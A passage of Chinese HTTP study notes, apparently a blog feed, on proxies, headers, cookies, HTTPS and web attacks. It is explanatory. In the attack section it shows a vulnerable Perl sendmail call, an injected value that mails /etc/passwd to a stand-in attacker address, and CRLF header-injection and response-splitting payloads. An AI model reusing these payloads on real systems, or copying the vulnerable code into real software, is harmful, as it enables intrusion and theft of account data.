<ul>
<li>代理服务器的基本行为就是接收客户端发送的请求后转发给其他服务器。代理不改变请求 URI，会直接发送给前方持有资源的目标服务器。</li>
<li>使用代理服务器的理由有：利用缓存技术减少网络带宽的流量，组织内部针对特定网站的访问控制，以获取访问日志为主要目的，等等（科学上网！嘿嘿！）。</li>
<li>缓存代理：代理转发响应时，缓存代理（Caching Proxy）会预先将资源的副本（缓存）保存在代理服务器上。当代理再次接收到对相同资源的请求时，就可以不从源服务器那里获取资源，而是将之前缓存的资源作为响应返回。</li>
<li>透明代理：转发请求或响应时，不对报文做任何加工的代理类型被称为透明代理（Transparent Proxy）。反之，对报文内容进行加工的代理被称为非透明代理。
<img :src="$withBase('/images/HTTP/代理.png')" loading="lazy"></li>
</ul>
</blockquote>
</li>
<li>
<p>网关。</p>
<blockquote>
<ul>
<li>网关的工作机制和代理十分相似。而网关能使通信线路上的服务器提供非 HTTP 协议服务。</li>
<li>利用网关能提高通信的安全性，因为可以在客户端与网关之间的通信线路上加密以确保连接的安全。比如，网关可以连接数据库，使用 SQL 语句查询数据。另外，在 Web 购物网站上进行信用卡结算时，网关可以和信用卡结算系统联动。
<img :src="$withBase('/images/HTTP/网关.png')" loading="lazy"></li>
</ul>
</blockquote>
</li>
<li>
<p>隧道。</p>
<blockquote>
<ul>
<li>隧道可按要求建立起一条与其他服务器的通信线路，届时使用 SSL 等加密手段进行通信。隧道的目的是确保客户端能与服务器进行安全的通信。</li>
<li>隧道本身不会去解析 HTTP 请求。也就是说，请求保持原样中转给之后的服务器。隧道会在通信双方断开连接时结束。</li>
<li>隧道本身是透明的，客户端不用在意隧道的存在。
<img :src="$withBase('/images/HTTP/隧道.png')" loading="lazy"></li>
</ul>
</blockquote>
</li>
</ul>
<h2 id="_22-http-1-1-首部字段一览"> 22. HTTP/1.1 首部字段一览</h2>
<ul>
<li>
<p>通用首部字段。</p>
<img :src="$withBase('/images/HTTP/通用首部字段.png')" loading="lazy">
</li>
<li>
<p>请求首部字段。</p>
<img :src="$withBase('/images/HTTP/请求首部字段.png')" loading="lazy">
</li>
<li>
<p>响应首部字段。</p>
<img :src="$withBase('/images/HTTP/响应首部字段.png')" loading="lazy">
</li>
<li>
<p>实体首部字段。</p>
<img :src="$withBase('/images/HTTP/实体首部字段.png')" loading="lazy">
</li>
</ul>
<h2 id="_23-http-1-1-通用首部字段"> 23. HTTP/1.1 通用首部字段</h2>
<ul>
<li>
<p>Cache-Control：通过指定首部字段 Cache-Control 的指令，就能操作缓存的工作机制。指令的参数是可选的，多个指令之间通过 “,” 分隔。首部字段 Cache-Control 的指令可用于请求及响应时。</p>
</li>
<li>
<p>缓存请求指令。</p>
<img :src="$withBase('/images/HTTP/缓存请求指令.png')" loading="lazy">
</li>
<li>
<p>缓存响应指令。</p>
<img :src="$withBase('/images/HTTP/缓存响应指令.png')" loading="lazy">
</li>
<li>
<p>no-cache 指令：由服务器返回的响应中，若报文首部字段 Cache-Control 中对 no-cache 字段名具体指定参数值，那么客户端在接收到这个被指定参数值的首部字段对应的响应报文后，就不能使用缓存。换言之，无参数值的首部字段可以使用缓存。只能在响应指令中指定该参数。</p>
<div><pre><code><span><span>Cache-Control</span><span>:</span> <span>no-cache=Location</span></span>
</code></pre>
<div><span>1</span><br></div></div></li>
<li>
<p>no-store：从字面意思上很容易把 no-cache 误解成为不缓存，但事实上 no-cache 代表不缓存过期的资源，缓存会向源服务器进行有效期确认后处理资源，也许称为 do-not-serve-from-cache-without-revalidation 更合适。no-store 才是真正地不进行缓存，请读者注意区别理解。</p>
</li>
<li>
<p>s-maxage 指令：s-maxage 指令的功能和 max-age 指令的相同，它们的不同点是 s-maxage 指令只适用于供多位用户使用的公共缓存服务器。也就是说，对于向同一用户重复返回响应的服务器来说，这个指令没有任何作用。另外，当使用 s-maxage 指令后，则直接忽略对 Expires 首部字段及 max-age 指令的处理。</p>
</li>
<li>
<p>max-age 指令：应用 HTTP/1.1 版本的缓存服务器遇到同时存在 Expires 首部字段的情况时，会优先处理 max-age 指令，而忽略掉 Expires 首部字段。而 HTTP/1.0 版本的缓存服务器的情况却相反，max-age 指令会被忽略掉。</p>
</li>
<li>
<p>no-transform 指令：使用 no-transform 指令规定无论是在请求还是响应中，缓存都不能改变实体主体的媒体类型。这样做可防止缓存或代理压缩图片等类似操作。</p>
</li>
</ul>
<h2 id="_24-请求首部字段"> 24. 请求首部字段</h2>
<ul>
<li>
<p>Referer：首部字段 Referer 会告知服务器请求的原始资源的 URI。客户端一般都会发送 Referer 首部字段给服务器。但当直接在浏览器的地址栏输入 URI，或出于安全性的考虑时，也可以不发送该首部字段（有时在项目开发中获取网络图片资源，可能会返回 403，这时可以试试不发送 Referer 后能不能获取图片-<a href="/note/project/HTML/#_2-ie-配置-如果安装了-gcf-google-内核渲染-则使用-gcf-来渲染页面-如果未安装-gcf-则使用最高版本的-ie-内核进行渲染">配置全局不携带请求域</a>）。另外，Referer 的正确的拼写应该是 Referrer，但不知为何，大家一直沿用这个错误的拼写。</p>
</li>
<li>
<p>User-Agent：首部字段 User-Agent 会将创建请求的浏览器和用户代理名称等信息传达给服务器（嘿嘿！玩爬虫要这个哟！）。</p>
</li>
</ul>
<h2 id="_25-响应首部字段"> 25. 响应首部字段</h2>
<ul>
<li>
<p>ETag：首部字段 ETag 能告知客户端实体标识。它是一种可将资源以字符串形式做唯一性标识的方式。服务器会为每份资源分配对应的 ETag 值。另外，当资源更新时，ETag 值也需要更新。生成 ETag 值时，并没有统一的算法规则，而仅仅是由服务器来分配。</p>
<blockquote>
<p>强 ETag 值，不论实体发生多么细微的变化都会改变其值。</p>
</blockquote>
<div><pre><code><span><span>ETag</span><span>:</span> <span>"usagi-1234"</span></span>
</code></pre>
<div><span>1</span><br></div></div><blockquote>
<p>弱 ETag 值只用于提示资源是否相同。只有资源发生了根本改变，产生差异时才会改变 ETag 值。这时，会在字段值最开始处附加 W/。</p>
</blockquote>
<div><pre><code><span><span>ETag</span><span>:</span> <span>W/"usagi-1234"</span></span>
</code></pre>
<div><span>1</span><br></div></div><img :src="$withBase('/images/HTTP/ETag.png')" loading="lazy">
</li>
<li>
<p>Location：使用首部字段 Location 可以将响应接收方引导至某个与请求 URI 位置不同的资源。基本上，该字段会配合 3xx ：Redirection 的响应，提供重定向的 URI。几乎所有的浏览器在接收到包含首部字段 Location 的响应后，都会强制性地尝试对已提示的重定向资源的访问。</p>
</li>
<li>
<p>Server：首部字段 Server 告知客户端当前服务器上安装的 HTTP 服务器应用程序的信息。不单单会标出服务器上的软件应用名称，还有可能包括版本号和安装时启用的可选项。</p>
</li>
</ul>
<h2 id="_26-实体首部字段"> 26. 实体首部字段</h2>
<ul>
<li>
<p>Expires：首部字段 Expires 会将资源失效的日期告知客户端。缓存服务器在接收到含有首部字段 Expires 的响应后，会以缓存来应答请求，在 Expires 字段值指定的时间之前，响应的副本会一直被保存。当超过指定的时间后，缓存服务器在请求发送过来时，会转向源服务器请求资源。</p>
<blockquote>
<ul>
<li>源服务器不希望缓存服务器对资源缓存时，最好在 Expires 字段内写入与首部字段 Date 相同的时间值。</li>
<li>但是，当首部字段 Cache-Control 有指定 max-age 指令时，比起首部字段 Expires，会优先处理 max-age 指令。</li>
</ul>
</blockquote>
</li>
</ul>
<h2 id="_27-为-cookie-服务的首部字段"> 27. 为 Cookie 服务的首部字段</h2>
<ul>
<li>
<p>Cookie 的工作机制是用户识别及状态管理。Web 网站为了管理用户的状态会通过 Web 浏览器，把一些数据临时写入用户的计算机内。接着当用户访问该 Web 网站时，可通过通信方式取回之前发放的 Cookie。</p>
</li>
<li>
<p>Set-Cookie。</p>
<img :src="$withBase('/images/HTTP/Set-Cookie.png')" loading="lazy">
</li>
<li>
<p>HttpOnly 属性。</p>
<blockquote>
<ul>
<li>Cookie 的 HttpOnly 属性是 Cookie 的扩展功能，它使 JavaScript 脚本无法获得 Cookie。其主要目的为防止跨站脚本攻击（Cross-sitescripting，XSS）对 Cookie 的信息窃取。</li>
</ul>
</blockquote>
<div><pre><code><span><span>Set-Cookie</span><span>:</span> <span>name=value; HttpOnly</span></span>
</code></pre>
<div><span>1</span><br></div></div><blockquote>
<ul>
<li>通过上述设置，通常从 Web 页面内还可以对 Cookie 进行读取操作。但使用 JavaScript 的 document.cookie 就无法读取附加 HttpOnly 属性后的 Cookie 的内容了。因此，也就无法在 XSS 中利用 JavaScript 劫持 Cookie 了。</li>
<li>该扩展并非是为了防止 XSS 而开发的。</li>
</ul>
</blockquote>
</li>
</ul>
<h2 id="_28-其他首部字段"> 28. 其他首部字段</h2>
<ul>
<li>
<p>HTTP 首部字段是可以自行扩展的。下面为最为常用的首部字段。</p>
</li>
<li>
<p>X-Frame-Options：首部字段 X-Frame-Options 属于 HTTP 响应首部，用于控制网站内容在其他 Web 网站的 Frame 标签内的显示问题。其主要目的是为了防止点击劫持（clickjacking）攻击。</p>
<blockquote>
<ul>
<li>DENY ：拒绝。</li>
<li>SAMEORIGIN ：仅同源域名下的页面（Top-level-browsing-context）匹配时许可。（比如，当指定 http://hackr.jp/sample.html页面为 SAMEORIGIN 时，那么 hackr.jp 上所有页面的 frame 都被允许可加载该页面，而 example.com 等其他域名的页面就不行了）。</li>
</ul>
</blockquote>
</li>
<li>
<p>X-XSS-Protection：首部字段 X-XSS-Protection 属于 HTTP 响应首部，它是针对跨站脚本攻击（XSS）的一种对策，用于控制浏览器 XSS 防护机制的开关。</p>
<blockquote>
<ul>
<li>0 ：将 XSS 过滤设置成无效状态。</li>
<li>1 ：将 XSS 过滤设置成有效状态。</li>
</ul>
</blockquote>
</li>
<li>
<p>DNT：首部字段 DNT 属于 HTTP 请求首部，其中 DNT 是 Do Not Track 的简称，意为拒绝个人信息被收集，是表示拒绝被精准广告追踪的一种方法。</p>
<blockquote>
<ul>
<li>0 ：同意被追踪。</li>
<li>1 ：拒绝被追踪。</li>
</ul>
</blockquote>
</li>
<li>
<p>P3P：首部字段 P3P 属于 HTTP 相应首部，通过利用 P3P（The Platform forPrivacy Preferences，在线隐私偏好平台）技术，可以让 Web 网站上的个人隐私变成一种仅供程序可理解的形式，以达到保护用户隐私的目的。</p>
</li>
</ul>
<h2 id="_29-http-的缺点"> 29. HTTP 的缺点</h2>
<ul>
<li>
<p>通信使用明文（不加密），内容可能会被窃听：由于 HTTP 本身不具备加密的功能，所以也无法做到对通信整体（使用 HTTP 协议通信的请求和响应的内容）进行加密。即，HTTP 报文使用明文（指未经过加密的报文）方式发送。</p>
<ul>
<li>
<p>通信的加密。</p>
<blockquote>
<ul>
<li>HTTP 协议中没有加密机制，但可以通过和 SSL（Secure Socket Layer，安全套接层）或 TLS（Transport Layer Security，安全层传输协议）的组合使用，加密 HTTP 的通信内容。</li>
<li>用 SSL 建立安全通信线路之后，就可以在这条线路上进行 HTTP 通信了。与 SSL 组合使用的 HTTP 被称为 HTTPS（HTTPSecure，超文本传输安全协议）或 HTTP over SSL。</li>
</ul>
</blockquote>
<img :src="$withBase('/images/HTTP/通信的加密.png')" loading="lazy">
</li>
<li>
<p>内容的加密。</p>
<blockquote>
<ul>
<li>由于 HTTP 协议中没有加密机制，那么就对 HTTP 协议传输的内容本身加密。即把 HTTP 报文里所含的内容进行加密处理。</li>
<li>在这种情况下，客户端需要对 HTTP 报文进行加密处理后再发送请求。诚然，为了做到有效的内容加密，前提是要求客户端和服务器同时具备加密和解密机制。主要应用在 Web 服务中。</li>
<li>有一点必须引起注意，由于该方式不同于 SSL 或 TLS 将整个通信线路加密处理，所以内容仍有被篡改的风险。</li>
</ul>
</blockquote>
<img :src="$withBase('/images/HTTP/内容的加密.png')" loading="lazy">
</li>
</ul>
</li>
<li>
<p>不验证通信方的身份，因此有可能遭遇伪装：HTTP 协议中的请求和响应不会对通信方进行确认。也就是说存在“服务器是否就是发送请求中 URI 真正指定的主机，返回的响应是否真的返回到实际提出请求的客户端”等类似问题。</p>
<ul>
<li>
<p>任何人都可发起请求。</p>
<blockquote>
<p>HTTP 协议的实现本身非常简单，不论是谁发送过来的请求都会返回响应，因此不确认通信方，会存在以下各种隐患。</p>
<ol>
<li>无法确定请求发送至目标的 Web 服务器是否是按真实意图返回响应的那台服务器。有可能是已伪装的 Web 服务器。</li>
<li>无法确定响应返回到的客户端是否是按真实意图接收响应的那个客户端。有可能是已伪装的客户端。</li>
<li>无法确定正在通信的对方是否具备访问权限。因为某些 Web 服务器上保存着重要的信息，只想发给特定用户通信的权限。</li>
<li>无法判定请求是来自何方、出自谁手。</li>
<li>即使是无意义的请求也会照单全收。无法阻止海量请求下的 DoS 攻击（Denial of Service，拒绝服务攻击）。</li>
</ol>
</blockquote>
</li>
<li>
<p>查明对手的证书。</p>
<blockquote>
<p>虽然使用 HTTP 协议无法确定通信方，但如果使用 SSL 则可以。SSL 不仅提供加密处理，而且还使用了一种被称为证书的手段，可用于确定方。</p>
</blockquote>
<img :src="$withBase('/images/HTTP/查明对手的证书.png')" loading="lazy">
</li>
</ul>
</li>
<li>
<p>无法证明报文的完整性，所以有可能已遭篡改。</p>
<ul>
<li>
<p>接收到的内容可能有误。</p>
<blockquote>
<p>由于 HTTP 协议无法证明通信的报文完整性，因此，在请求或响应送出之后直到对方接收之前的这段时间内，即使请求或响应的内容遭到篡改，也没有办法获悉。换句话说，没有任何办法确认，发出的请求 / 响应和接收到的请求 / 响应是前后相同的。</p>
</blockquote>
<img :src="$withBase('/images/HTTP/接收到的内容可能有误.png')" loading="lazy">
</li>
<li>
<p>如何防止篡改。</p>
<blockquote>
<ul>
<li>虽然有使用 HTTP 协议确定报文完整性的方法，但事实上并不便捷、可靠。其中常用的是 MD5 和 SHA-1 等散列值校验的方法，以及用来确认文件的数字签名方法。</li>
<li>可惜的是，用这些方法也依然无法百分百保证确认结果正确。因为 PGP 和 MD5 本身被改写的话，用户是没有办法意识到的。</li>
<li>为了有效防止这些弊端，有必要使用 HTTPS。SSL 提供认证和加密处理及摘要功能。仅靠 HTTP 确保完整性是非常困难的，因此通过和其他协议组合使用来实现这个目标。</li>
</ul>
</blockquote>
</li>
</ul>
</li>
</ul>
<h2 id="_30-http-加密-认证-完整性保护-https"> 30. HTTP+ 加密 + 认证 + 完整性保护 = HTTPS</h2>
<ul>
<li>
<p>HTTP 加上加密处理和认证以及完整性保护后即是 HTTPS。</p>
<img :src="$withBase('/images/HTTP/使用 HTTPS 通信.png')" loading="lazy">
</li>
<li>
<p>HTTPS 是身披 SSL 外壳的 HTTP。</p>
<blockquote>
<ul>
<li>HTTPS 并非是应用层的一种新协议。只是 HTTP 通信接口部分用 SSL（Secure Socket Layer）和 TLS（Transport Layer Security）协议代替而已。</li>
<li>通常，HTTP 直接和 TCP 通信。当使用 SSL 时，则演变成先和 SSL 通信，再由 SSL 和 TCP 通信了。简言之，所谓 HTTPS，其实就是身披 SSL 协议这层外壳的 HTTP。</li>
<li>SSL 是独立于 HTTP 的协议，所以不光是 HTTP 协议，其他运行在应用层的 SMTP 和 Telnet 等协议均可配合 SSL 协议使用。可以说 SSL 是当今世界上应用最为广泛的网络安全技术。</li>
</ul>
</blockquote>
</li>
<li>
<p>相互交换密钥的公开密钥加密技术。</p>
<ul>
<li>
<p>在对 SSL 进行讲解之前，我们先来了解一下加密方法。SSL 采用一种叫做公开密钥加密（Public-key cryptography）的加密处理方式。近代的加密方法中加密算法是公开的，而密钥却是保密的。通过这种方式得以保持加密方法的安全性。加密和解密都会用到密钥。没有密钥就无法对密码解密，反过来说，任何人只要持有密钥就能解密了。如果密钥被攻击者获得，那加密也就失去了意义。</p>
</li>
<li>
<p>共享密钥加密的困境：加密和解密同用一个密钥的方式称为共享密钥加密（Common keycrypto system），也被叫做对称密钥加密。</p>
<blockquote>
<ul>
<li>以共享密钥方式加密时必须将密钥也发给对方。可究竟怎样才能安全地转交？在互联网上转发密钥时，如果通信被监听那么密钥就可会落入攻击者之手，同时也就失去了加密的意义。另外还得设法安全地保管接收到的密钥。</li>
</ul>
</blockquote>
<img :src="$withBase('/images/HTTP/共享密钥加密的困境.png')" loading="lazy">
</li>
<li>
<p>使用两把密钥的公开密钥加密。</p>
<blockquote>
<ul>
<li>公开密钥加密使用一对非对称的密钥。一把叫做私有密钥（private key），另一把叫做公开密钥（public key）。顾名思义，私有密钥不能让其他任何人知道，而公开密钥则可以随意发布，任何人都可以获得。</li>
<li>使用公开密钥加密方式，发送密文的一方使用对方的公开密钥进行加密处理，对方收到被加密的信息后，再使用自己的私有密钥进行解密。利用这种方式，不需要发送用来解密的私有密钥，也不必担心密钥被攻击者窃听而盗走。</li>
<li>另外，要想根据密文和公开密钥，恢复到信息原文是异常困难的，因为解密过程就是在对离散对数进行求值，这并非轻而易举就能办到。</li>
</ul>
</blockquote>
<img :src="$withBase('/images/HTTP/使用两把密钥的公开密钥加密.png')" loading="lazy">
</li>
<li>
<p>HTTPS 采用混合加密机制。</p>
<blockquote>
<ul>
<li>HTTPS 采用共享密钥加密和公开密钥加密两者并用的混合加密机制。若密钥能够实现安全交换，那么有可能会考虑仅使用公开密钥加密来通信。但是公开密钥加密与共享密钥加密相比，其处理速度要慢。</li>
<li>所以应充分利用两者各自的优势，将多种方法组合起来用于通信。在交换密钥环节使用公开密钥加密方式，之后的建立通信交换报文阶段则使用共享密钥加密方式。</li>
</ul>
</blockquote>
<img :src="$withBase('/images/HTTP/HTTPS 采用混合加密机制.png')" loading="lazy">
</li>
</ul>
</li>
<li>
<p>证明公开密钥正确性的证书。</p>
<blockquote>
<ul>
<li>遗憾的是，公开密钥加密方式还是存在一些问题的。那就是无法证明公开密钥本身就是货真价实的公开密钥。比如，正准备和某台服务器建立公开密钥加密方式下的通信时，如何证明收到的公开密钥就是原本预想的那台服务器发行的公开密钥。或许在公开密钥传输途中，真正的公开密钥已经被攻击者替换掉了。</li>
<li>为了解决上述问题，可以使用由数字证书认证机构（CA，CertificateAuthority）和其相关机关颁发的公开密钥证书。</li>
</ul>
</blockquote>
<img :src="$withBase('/images/HTTP/证明公开密钥正确性的证书.png')" loading="lazy">
</li>
</ul>
<h2 id="_31-https-的安全通信机制"> 31. HTTPS 的安全通信机制</h2>
<ul>
<li>
<p>HTTPS 通信。</p>
<img :src="$withBase('/images/HTTP/HTTPS 通信.png')" loading="lazy">
<blockquote>
<p>CBC 模式（Cipher Block Chaining）又名密码分组链接模式。在此模式下，将前一个明文块加密处理后和下一个明文块做 XOR 运算，使之重叠，然后再对运算结果做加密处理。对第一个明文块做加密时，要么使用前一段密文的最后一块，要么利用外部生成的初始向量（initial vector，IV）。</p>
</blockquote>
</li>
<li>
<p>SSL 速度慢。</p>
<blockquote>
<ul>
<li>HTTPS 也存在一些问题，那就是当使用 SSL 时，它的处理速度会变慢。</li>
</ul>
</blockquote>
<img :src="$withBase('/images/HTTP/SSL 速度慢.png')" loading="lazy">
<blockquote>
<ul>
<li>SSL 的慢分两种。一种是指通信慢。另一种是指由于大量消耗 CPU 及内存等资源，导致处理速度变慢。</li>
<li>和使用 HTTP 相比，网络负载可能会变慢 2 到 100 倍。除去和 TCP 连接、发送 HTTP 请求 • 响应以外，还必须进行 SSL 通信，因此整体上处理通信量不可避免会增加。</li>
<li>另一点是 SSL 必须进行加密处理。在服务器和客户端都需要进行加密和解密的运算处理。因此从结果上讲，比起 HTTP 会更多地消耗服务器和客户端的硬件资源，导致负载增强。</li>
<li>针对速度变慢这一问题，并没有根本性的解决方案，我们会使用 SSL 加速器这种（专用服务器）硬件来改善该问题。该硬件为 SSL 通信专用硬件，相对软件来讲，能够提高数倍 SSL 的计算速度。仅在 SSL 处理时发挥 SSL 加速器的功效，以分担负载。</li>
</ul>
</blockquote>
</li>
</ul>
<h2 id="_32-websocket-协议特点"> 32. WebSocket 协议特点</h2>
<ul>
<li>
<p>推送功能：支持由服务器向客户端推送数据的推送功能。这样，服务器可直接发送数据，而不必等待客户端的请求。</p>
</li>
<li>
<p>减少通信量：只要建立起 WebSocket 连接，就希望一直保持连接状态。和 HTTP 相比，不但每次连接时的总开销减少，而且由于 WebSocket 的首部信息很小，通信量也相应减少了。</p>
</li>
</ul>
<h2 id="_33-web-的攻击技术"> 33. Web 的攻击技术</h2>
<ul>
<li>
<p>针对 Web 应用的攻击模式。</p>
<ul>
<li>
<p>以服务器为目标的主动攻击。</p>
<blockquote>
<ul>
<li>主动攻击（active attack）是指攻击者通过直接访问 Web 应用，把攻击代码传入的攻击模式。由于该模式是直接针对服务器上的资源进行攻击，因此攻击者需要能够访问到那些资源。</li>
<li>主动攻击模式里具有代表性的攻击是 SQL 注入攻击和 OS 命令注入攻击。</li>
</ul>
</blockquote>
<img :src="$withBase('/images/HTTP/以服务器为目标的主动攻击.png')" loading="lazy">
</li>
<li>
<p>以服务器为目标的被动攻击。</p>
<ul>
<li>
<p>被动攻击（passive attack）是指利用圈套策略执行攻击代码的攻击模式。在被动攻击过程中，攻击者不直接对目标 Web 应用访问发起攻击。被动攻击通常的攻击模式如下所示。</p>
<blockquote>
<ol>
<li>攻击者诱使用户触发已设置好的陷阱，而陷阱会启动发送已嵌入攻击代码的 HTTP 请求。</li>
<li>当用户不知不觉中招之后，用户的浏览器或邮件客户端就会触发这个陷阱。</li>
<li>中招后的用户浏览器会把含有攻击代码的 HTTP 请求发送给作为攻击目标的 Web 应用，运行攻击代码。</li>
<li>执行完攻击代码，存在安全漏洞的 Web 应用会成为攻击者的跳板，可能导致用户所持的 Cookie 等个人信息被窃取，登录状态中的用户权限遭恶意滥用等后果。</li>
</ol>
<ul>
<li>被动攻击模式中具有代表性的攻击是跨站脚本攻击和跨站点请求伪造。</li>
</ul>
</blockquote>
<img :src="$withBase('/images/HTTP/以服务器为目标的被动攻击.png')" loading="lazy">
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>因输出值转义不完全引发的安全漏洞。</p>
<blockquote>
<p>实施 Web 应用的安全对策可大致分为两部分：客户端的验证和 Web 应用端（服务器端）的验证 —— 输入值验证或输出值转义。</p>
</blockquote>
</li>
<li>
<p>跨站脚本攻击。</p>
<ul>
<li>
<p>跨站脚本攻击（Cross-Site Scripting，XSS）是指通过存在安全漏洞的 Web 网站注册用户的浏览器内运行非法的 HTML 标签或 JavaScript 进行的一种攻击。动态创建的 HTML 部分有可能隐藏着安全漏洞。就这样，攻击者编写脚本设下陷阱，用户在自己的浏览器上运行时，一不小心就会受到被动攻击，跨站脚本攻击有可能造成以下影响。</p>
<blockquote>
<ol>
<li>利用虚假输入表单骗取用户个人信息。</li>
<li>利用脚本窃取用户的 Cookie 值，被害者在不知情的情况下，帮助攻击者发送恶意请求。</li>
<li>显示伪造的文章或图片。</li>
</ol>
</blockquote>
<img :src="$withBase('/images/HTTP/跨站脚本攻击.png')" loading="lazy">
</li>
</ul>
</li>
<li>
<p>SQL 注入攻击。</p>
<blockquote>
<p>SQL 注入（SQL Injection）是指针对 Web 应用使用的数据库，通过运行非法的 SQL 而产生的攻击。该安全隐患有可能引发极大的威胁，有时会直接导致个人信息及机密信息的泄露。</p>
</blockquote>
<img :src="$withBase('/images/HTTP/SQL 注入攻击.png')" loading="lazy">
</li>
<li>
<p>OS 命令注入攻击。</p>
<blockquote>
<p>OS 命令注入攻击（OS Command Injection）是指通过 Web 应用，执行非法的操作系统命令达到攻击的目的。只要在能调用 Shell 函数的地方就有存在被攻击的风险。</p>
</blockquote>
<img :src="$withBase('/images/HTTP/OS 命令注入攻击.png')" loading="lazy">
<blockquote>
<p>下面摘选处理该表单内容的一部分核心代码。</p>
</blockquote>
<div><pre><code>my $adr <span>=</span> $q<span>-</span><span>></span><span>param</span><span>(</span><span>'mailaddress'</span><span>)</span><span>;</span>
<span>open</span><span>(</span><span>MAIL</span><span>,</span> <span>"| /usr/sbin/sendmail $adr"</span><span>)</span><span>;</span>
print <span>MAIL</span> <span>"From: info@example.com\n"</span><span>;</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><blockquote>
<ol>
<li>程序中的 open 函数会调用 sendmail 命令发送邮件，而指定的邮件发送地址即 $adr 的值。</li>
<li>攻击者将下面的值指定作为邮件地址。</li>
</ol>
</blockquote>
<div><pre><code><span>;</span> <span>cat</span> /etc/passwd <span>|</span> mail hack@example.jp
</code></pre>
<div><span>1</span><br></div></div><blockquote>
<ol start="3">
<li>程序接收该值，构成以下的命令组合。</li>
</ol>
</blockquote>
<div><pre><code><span>|</span> /usr/sbin/sendmail <span>;</span> <span>cat</span> /etc/passwd <span>|</span> mail hack@example.jp
</code></pre>
<div><span>1</span><br></div></div><blockquote>
<ol start="4">
<li>攻击者的输入值中含有分号（;）。这个符号在 OS 命令中，会被解析为分隔多个执行命令的标记。</li>
<li>可见，sendmail 命令执行被分隔后，接下去就会执行 cat/etc/passwd | mail hack@example.jp 这样的命令了。结果，含有 Linux 账户信息 /etc/passwd 的文件，就以邮件形式发送给了 hack@example.jp。</li>
</ol>
</blockquote>
</li>
<li>
<p>HTTP 首部注入攻击。</p>
<ul>
<li>
<p>HTTP 首部注入攻击（HTTP Header Injection）是指攻击者通过在响应首部字段内插入换行，添加任意响应首部或主体的一种攻击。属于被动攻击模式。</p>
<blockquote>
<p>如下所示，Web 应用有时会把从外部接收到的数值，赋给响应首部字段 Location 和 Set-Cookie。</p>
</blockquote>
<div><pre><code><span><span>Location</span><span>:</span> <span>http://www.example.com/a.cgi?q=12345</span></span>
<span><span>Set-Cookie</span><span>:</span> <span>UID=12345</span></span>
＊12345就是插入值
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><blockquote>
<ul>
<li>HTTP 首部注入可能像这样，通过在某些响应首部字段需要处理输出值的地方，插入换行发动攻击。</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>HTTP 首部注入攻击有可能会造成以下一些影响。</li>
<li>1、设置任何 Cookie 信息。</li>
<li>2、重定向至任意 URL。</li>
<li>3、显示任意的主体（HTTP 响应截断攻击）。</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>攻击者以下面的内容替代之前的类别 ID 后发送请求。</li>
</ul>
</blockquote>
<div><pre><code>101%0D%0ASet-Cookie:+SID=123456789
</code></pre>
<div><span>1</span><br></div></div><blockquote>
<ul>
<li>其中，%0D%0A 代表 HTTP 报文中的换行符，紧接着的是可强制将攻击者网站（http://hackr.jp/）的会话 ID 设置成 SID=123456789 的 Set-Cookie 首部字段。</li>
<li>此刻，首部字段 Set-Cookie 已生效，因此攻击者可指定修改任意的 Cookie 信息。通过和会话固定攻击（攻击者可使用指定的会话 ID）攻击组合，攻击者可伪装成用户。</li>
<li>攻击者输入的 %0D%0A，原本应该属于首部字段 Location 的查询值部分，但经过解析后，%0D%0A 变成了换行符，结果插入了新的首部字段。</li>
<li>这样一来，攻击者可在响应中插入任意的首部字段。</li>
</ul>
</blockquote>
</li>
<li>
<p>HTTP 响应截断攻击。</p>
<blockquote>
<p>HTTP 响应截断攻击是用在 HTTP 首部注入的一种攻击。攻击顺序相同，但是要将两个 %0D%0A%0D%0A 并排插入字符串后发送。利用这两个连续的换行就可作出 HTTP 首部与主体分隔所需的空行了，这样就能显示伪造的主体，达到攻击目的。这样的攻击叫做 HTTP 响应截断攻击。</p>
</blockquote>
<div><pre><code>%0D%0A%0D%0A&lt;HTML>&lt;HEAD>&lt;TITLE>之后，想要显示的网页内容 &lt;!
</code></pre>
<div><span>1</span><br></div></div><blockquote>
<p>在可能进行 HTTP 首部注入的环节，通过发送上面的字符串，返回结果得到以下这种响应。</p>
</blockquote>
<div><pre><code><span><span>Set-Cookie</span><span>:</span> <span>UID=（%0D%0A ：换行符）</span></span>
（%0D%0A ：换行符）
&lt;HTML>&lt;HEAD>&lt;TITLE>之后，想要显示的网页内容 &lt;!--（原来页面对应的首部字段和主体部分全视为注释）
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><blockquote>
<p>利用这个攻击，已触发陷阱的用户浏览器会显示伪造的 Web 页面，再让用户输入自己的个人信息等，可达到和跨站脚本攻击相同的效果。</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>跨站点请求伪造。</p>
<ul>
<li>
<p>跨站点请求伪造（Cross-Site Request Forgeries，CSRF）攻击是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击，跨站点请求伪造有可能会造成以下等影响。</p>
<blockquote>
<ol>
<li>利用已通过认证的用户权限更新设定信息等。</li>
<li>利用已通过认证的用户权限购买商品。</li>
<li>利用已通过认证的用户权限在留言板上发表言论。</li>
</ol>
</blockquote>
<img :src="$withBase('/images/HTTP/跨站点请求伪造.png')" loading="lazy">
</li>
</ul>
</li>
</ul>
<h2 id="_34-其他安全漏洞"> 34. 其他安全漏洞</h2>
<ul>
<li>
<p>点击劫持：点击劫持（Clickjacking）是指利用透明的按钮或链接做成陷阱，覆盖在 Web 页面之上。然后诱使用户在不知情的情况下，点击那个链接访问内容的一种攻击手段。这种行为又称为界面伪装（UIRedressing）。</p>
</li>
<li>
<p>DoS 攻击：DoS 攻击（Denial of Service attack）是一种让运行中的服务呈停止状态的攻击。有时也叫做服务停止攻击或拒绝服务攻击。DoS 攻击的对象不仅限于 Web 网站，还包括网络设备及服务器等。主要有以下两种 DoS 攻击方式：</p>
<blockquote>
<ul>
<li>集中利用访问请求造成资源过载，资源用尽的同时，实际上服务也就呈停止状态。</li>
<li>通过攻击安全漏洞使服务停止。</li>
</ul>
</blockquote>
</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>JavaScript 悟道</title>
      <link>https://www.matrixtheone.ga/web/note/books/How-JavaScript-Works/</link>
      <guid>https://www.matrixtheone.ga/web/note/books/How-JavaScript-Works/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">JavaScript 悟道</source>
